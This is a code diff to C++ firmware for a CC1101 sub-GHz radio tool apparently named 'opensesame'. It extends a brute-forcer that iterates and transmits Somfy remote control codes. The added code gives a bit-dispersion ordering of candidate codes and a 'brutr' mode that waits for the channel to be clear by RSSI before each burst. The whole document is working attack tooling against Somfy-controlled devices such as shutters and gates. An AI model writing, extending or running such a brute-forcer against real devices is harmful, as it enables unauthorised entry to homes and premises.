@@ -17,8 +17,10 @@ CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_somfy_processr(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[]);
 CmdHandler* getRootCommandHandler(void);
 CC1101* getRadio(void);
@@ -33,7 +35,11 @@ typedef struct SomfyBruteContext_s
     uint64_t itstart;
     uint64_t itend;
     uint64_t curr;
+    uint8_t bit_spread_strategy;
     bool cont;
+    bool use_rssi;
+    int rssi;
+    int rssi_wait_ms;
 
 } SomfyBruteContext_t;
 //------------------------------------------------------------------------------------------------------------------
@@ -53,7 +59,9 @@ cmd_handler_t open_sesame_somfy_sub_cmd[] = {
    { &open_sesame_somfy_setmask,   &open_sesame_handler, NULL, "smsk", "set iteration mask c0msk<hex> c1msk<hex> c2msk<hex>", 3, "xxx", "opensesame somfy smsk 007FFFFF FFFFFFFF 00070000"},
    { &open_sesame_somfy_setirange, &open_sesame_handler, NULL, "sir",  "set iteration range start_hi<hex> start_lo<hex> end_hi<hex> end_lo<hex>", 4, "xxxx", "opensesame somfy sir 00000000 00000000 FFFFFFFF FFFFFFFF"},
    { &open_sesame_somfy_setirangea, &open_sesame_handler, NULL, "sira",  "set auto iteration, set mask first", 0, "", "opensesame somfy sira"},
+   { &open_sesame_somfy_setibds,   &open_sesame_handler, NULL, "sibds",  "set iteration bit dispersion strategy: 0 - none, 1 - assymetric, 2 - quad-asssymetric", 1, "i", "opensesame somfy sibds 1"},
    { &open_sesame_somfy_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brute 10000<int ms>"},
+   { &open_sesame_somfy_processr , &open_sesame_handler, NULL, "brutr", "brute iteration of codes, display interval<int> minrssi<i>, if rssi > minrssi then wait for clear channel, wait after rssi detected <int> ms", 3, "isi", "opensesame somfy brute 10000<int ms> -60<int> 1000<int ms>"},
    { &open_sesame_somfy_cont     , &open_sesame_handler, NULL, "brutc", "continue brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brutc 10000<int ms>"},
    { 0,  0, NULL, "",  "", 0, "","" }
 };
@@ -66,6 +74,7 @@ void opensesame_cmd_init(void)
   somfy_ctx.c1 = 0x00000000;
   somfy_ctx.c1 = 0xffea8000;
   somfy_ctx.cont = false;
+  somfy_ctx.use_rssi = false;
 }
 //------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[])
@@ -142,6 +151,7 @@ CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[])
    somfy_ctx.c0 = c0;
    somfy_ctx.c1 = c1;
    somfy_ctx.c2 = c2;
+   somfy_ctx.use_rssi = false;
 
    if (c0 == 0 || c2 == 0)
        return WRONG_PARAMS;
@@ -177,6 +187,16 @@ CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[])
    return CmdStatus_e::OK;
 }
 //------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[])
+{
+  int strategy = atoi(argv[3]);
+  if (strategy < 0 || strategy > 2)
+     return WRONG_PARAMS;
+
+  somfy_ctx.bit_spread_strategy = strategy;
+  return CmdStatus_e::OK;
+}
+//------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[])
 {
 
@@ -208,6 +228,46 @@ String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, str
      return String(buffer);
     
 }
+
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_somfy_processr(void* parent,int argc, char* argv[])
+{
+    uint32_t disp = atoi(argv[3]);
+    
+    int rssi = atoi(argv[4]);
+
+    int wait_after_rssi = atoi(argv[5]);
+
+    STDOUT.print("d1:");
+    STDOUT.print(disp);STDOUT.print(" ");
+    STDOUT.print(rssi);STDOUT.print(" ");
+    STDOUT.print(wait_after_rssi);STDOUT.println(" ");
+    
+    if (disp == 0 || disp < 2000 || disp > 360000)
+    {
+         getRootCommandHandler()->setResultMessage("wrong display period");
+         return WRONG_PARAMS;
+    }
+    if (rssi < -100 || rssi > 100)
+    {
+        getRootCommandHandler()->setResultMessage("wrong rssi <-100,100>");
+        return WRONG_PARAMS;
+    }
+
+    if (wait_after_rssi < 0 || wait_after_rssi > 10000)
+    {
+        getRootCommandHandler()->setResultMessage("wrong time after channel occupied");
+        return WRONG_PARAMS;
+    }
+
+        
+   somfy_ctx.use_rssi = true;
+   somfy_ctx.rssi = rssi;
+   somfy_ctx.rssi_wait_ms = wait_after_rssi;
+
+
+   return open_sesame_somfy_process(parent, argc, argv);
+}    
 //------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
 {
@@ -265,14 +325,28 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
 
     uint32_t startMs = millis();
     uint32_t s = startMs;
+    
+    uint32_t bitLen = count_bits_set_uint32(somfy_ctx.c0msk);
+    bitLen += count_bits_set_uint32(somfy_ctx.c1msk);
+    bitLen += count_bits_set_uint32(somfy_ctx.c2msk);
+    
     while(somfy_ctx.curr <= somfy_ctx.itend && cont)
     {
        c0 = somfy_ctx.c0;
        c1 = somfy_ctx.c1;
        c2 = somfy_ctx.c2;
 
-       apply_value_to_bitmask(&c0, &c1, &c2, somfy_ctx.c0msk,somfy_ctx.c1msk,somfy_ctx.c2msk, somfy_ctx.curr);
+       uint64_t v;
 
+       if (somfy_ctx.bit_spread_strategy == 0)
+           v = somfy_ctx.curr;
+       else if (somfy_ctx.bit_spread_strategy == 1)
+           v = bit_spread_assymetric(somfy_ctx.curr, bitLen);          
+       else if (somfy_ctx.bit_spread_strategy == 2)
+           v = bit_spread_quad_assymetric(somfy_ctx.curr, bitLen);
+           
+       apply_value_to_bitmask(&c0, &c1, &c2, somfy_ctx.c0msk,somfy_ctx.c1msk,somfy_ctx.c2msk, v);
+       
        somfy.setCodes(c0, c1, c2);
 
        radio_pulses_flush();
@@ -283,6 +357,23 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
        pulses += p;
        somfy.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
        pulses += p;
+
+       if(somfy_ctx.use_rssi)
+       {
+          bool printMark = false;
+          uint32_t rs = millis();
+          
+          while (getRadio()->getRSSI() >= somfy_ctx.rssi && millis() -rs < somfy_ctx.rssi_wait_ms)
+          {
+             if(!printMark)
+             {    
+                  printMark = true;
+                  STDOUT.print("wait clear channel\n\r");
+             }
+             delayMicroseconds(1000 * somfy_ctx.rssi_wait_ms);
+          }
+       }
+       
        radio_pulses_send(0, pulses);
        
        if (millis() -s > disp)
